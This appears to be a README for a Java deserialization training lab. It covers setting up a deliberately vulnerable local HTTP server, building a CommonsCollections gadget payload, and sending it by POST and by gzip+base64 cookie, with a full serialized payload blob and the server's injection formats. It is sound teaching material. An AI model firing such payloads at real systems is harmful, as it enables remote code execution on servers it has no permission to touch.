# Lab for Java Deserialization Vulnerabilities


Content
--
Vulnerable testing application (VulnerableHTTPServer.java), which helps you test your payloads.


***Getting JDK***

If you dont want to go to the Oracle page and register, you can download the JDK directly from : http://www.joaomatosf.com/rnp/?prefix=rnp/java_files/

As **root**, run:
```
# cd /opt
# curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz 
# tar zxvf jdk-8u20-linux-x64.tar.gz
# rm -rf /usr/bin/java*
# ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
# java -version
  java version "1.8.0_20" 
```


***Getting codes:***

```
$ git clone https://github.com/dpredrag/Java-Deserialization-.git
$ cd Java-Deserialization-
```

***Compiling and executing Vulnerable Web Application:***

```
$ javac VulnerableHTTPServer.java -XDignore.symbol.file
$ java -cp .:commons-collections4-4.0.jar VulnerableHTTPServer
```


```
* =============================================================== *
*    Simple Java HTTP Server for Deserialization Lab v0.01        *
*    https://github.com/joaomatosf/JavaDeserH2HC                  *
* =============================================================== *
You can inject java serialized objects in the following formats:

 1) Binary in HTTP POST (ie \xAC\xED). Ex:
   $ curl 127.0.0.1:8000 --data-binary @ObjectFile.ser

 2) Base64 or Gzip+Base64 via HTTP POST parameters. Ex:
   $ curl 127.0.0.1:8000 -d "ViewState=H4sICAeH..."
   $ curl 127.0.0.1:8000 -d "ViewState=rO0ABXNy..."

 3) Base64 or Gzip+Base64 in cookies. Ex:
   $ curl 127.0.0.1:8000 -H "Cookie: JSESSIONID=H4sICAeH..."
   $ curl 127.0.0.1:8000 -H "Cookie: JSESSIONID=rO0ABXNy..."
   
 4) Base64 of AES-CBC encrypted with hardcoded Apache Shiro key. Ex:
   $ curl 127.0.0.1:8000 -H "Cookie: rememberMe=MTIzNDU2Nzg...
   
 5) XML for XStream RCE vulnerability/serialization. Ex:
   $ curl 127.0.0.1:8000 -d @file.xml
   
OBS: To test gadgets in specific libraries, run with -cp param. Ex:
$ java -cp .:commons-collections4-4.0.jar VulnerableHTTPServer
==================================================================

JRE Version: 1.8.0_77
[INFO]: Listening on port 8000
```

***Testing payloads***

Compiling example1 that works in applications with commons-collections4-4.0 in the classpath and JRE < 8u72:

```
$ javac -cp .:commons-collections4-4.0.jar ExampleCommonsCollections1.java
```

Generating payload:

```
$ java -cp .:commons-collections4-4.0.jar ExampleCommonsCollections1 'touch /tmp/h2hc_2017'
Saving serialized object in ExampleCommonsCollections1.ser
```

Exploiting vulnerable server:

Sending the payload in binary format via HTTP POST:
```
$ rm -rf /tmp/h2hc_2017
$ curl 127.0.0.1:8000/ --data-binary @ExampleCommonsCollections1.ser
Data deserialized!
$ ls -all /tmp/h2hc_2017
-rw-r--r-- 1 joao joao 0 mar 11 22:34 /tmp/h2hc_2017
```

Sending the payload in Gzip+Base64 format via HTTP Cookies:
```
$ rm -rf /tmp/h2hc_2017
$ gzip ExampleCommonsCollections1.ser
$ base64 -w0 ExampleCommonsCollections1.ser.gz
$ curl 127.0.0.1:8000/ -H "cookie: JSESSIONID=H4sICMeVuVkAA0V4YW1wbGVDb21tb25zQ29sbGVjdGlvbnMxLnNlcgCVVD1MFEEUfrd3iKDEAxVNiITGqER2kZhIuEKRBCFZlCAS4hU67M3dLuzOrjOz5x0ohY0tBQmxUQut/EmMtYWxMBEl0UZDZ2HURBMtrHVmd+9uAf+44u7tzfu+933vvdn7X6GOUehhPlEpztvY4CoixOWIWy5R+6vhMCm6RhANIZKzMT334seO3cvzdxVQdNjuYGcK0wlk+5hx2KFPoyLSfG7Z2gjyMjqkeNnDHJrDAxuRgjZgI8YyJY9dBYAENMkTVUJUASlR2BP8IVOrykapWyq/P7Da8TI9sKxAQoeEyWF/jDTK1DbIlYUuwTyAcNvp0oKKPGSYWDVcx3EJE7+2BFoydpCn6mi2LHSQD4vXbpbTi0lZrD6PDO7SMofDuqDQQgototBiFNo4RYTlXeqElSn0/aNm3ieSm6kDJrIIzsUIup8vfTk4u5QShrPQZMVORKu7spuT4tMI8jcxcciTic7v747uvaEAlDwxqZQwk/lvM+KJI8JjhJPFheZ+5dFiML4Gq5LBoSU2xjNT04JLyC1SaK7twZhPuOVgqH0211u5FTOYxtRc//RzZu7KSq8CySzUWf20IHq6M7tRig7brBHMTTd3Gjl4rdqznFqkkMmKlFFEkTMudl3QtGR/s+2i/xF9aCmiX1iZvJVmh+xKlxUOjQXMI8MC1BIHhWT3Wt8+XH51vjoZ4NAgMKFKXy57u2QSLUzXoKHW29/u9M5mHp8MoMUgNbgdrQGsTcK8aih4t1hB5/5EGppYM5aAtG0daWK9+6hzD95MfPy8b+5UxUmSQ702ZRGNieutdAnqXdz1DbND446nmT2mcaGn+8gxDilcwkZVVSIoqrHKzgQvkyHETHGR6+pXnz5rvfg6CcogNNouyg0Gl3kYGrhJMTNdO1fyjp8I9V/eKr7SgZOSsNpeUxx7OY5hjomM1hiXEvp+AaGU2MlXBQAA"
Data deserialized!
$ ls -all /tmp/h2hc_2017
-rw-r--r-- 1 joao joao 0 mar 11 22:47 /tmp/h2hc_2017
```

Examples (PoC's)
------


[![Alt text](https://img.youtube.com/vi/jVMr4eeJ2Po/0.jpg)](https://www.youtube.com/watch?v=jVMr4eeJ2Po)


[![Alt text](https://img.youtube.com/vi/JIWMItSA8l0/0.jpg)](https://www.youtube.com/watch?v=JIWMItSA8l0)
